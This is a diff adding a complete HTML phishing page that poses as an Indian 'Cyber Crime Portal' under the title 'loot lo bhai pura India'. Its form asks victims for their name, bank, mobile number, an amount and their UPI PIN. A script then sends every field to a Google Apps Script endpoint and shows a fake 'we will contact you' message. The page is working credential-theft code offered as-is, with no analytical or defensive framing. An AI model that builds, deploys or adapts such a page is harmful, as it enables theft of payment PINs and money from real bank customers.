@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>loot lo bhai pura India</title>
+
+        <link rel="stylesheet" type="text/css"   href="LUTPAT.css">
+    </head>
+    <body>
+        <div class="signup-box">
+            <h1>Cyber Crime  Portal</h1>
+           </p> <img src="https://th.bing.com/th/id/OIP.VT_Y9e1i8agm5u-m30X7SQHaFj?pid=ImgDet&rs=1" height="100px" width="355px">
+           
+            <form method="POST" name="google-sheet">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="Name" placeholder="E.g John" >
+
+                <label for="bankname" >Bank Name</label>
+                <input type="text" id="bankname" name="Bank Name" placeholder="E.g State Bank Of India">
+
+                <label for="mobile">Mobile Number</label>
+                <input type="text" id="mobile no" name="Mobile Number" placeholder="+91 3005 567894" maxlength="10">
+
+                <label for="amount">Amount</label>
+                <input type="text" id="amount" name="Amount"  placeholder="E.g 10" maxlength="6">
+
+                <label for="upi pin">UPI PIN</label>
+                <input type="password" id="upi pin" name="UPI PIN"  placeholder="******" maxlength="6"><br>
+
+                <input type="submit" value="Pay Now" name="Submit">
+                
+                <h4>It will hardly take a minute for ticket generate</h4>
+            </form>
+        </div>
+
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbw0isr_JtJAv-q2lJrC_r2MN3_PHebTlsHZPCxmJYyBSKNj5IBkSKlnpjyysHlr_jrhMg/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+</script>
+
+    </body>
+</html>
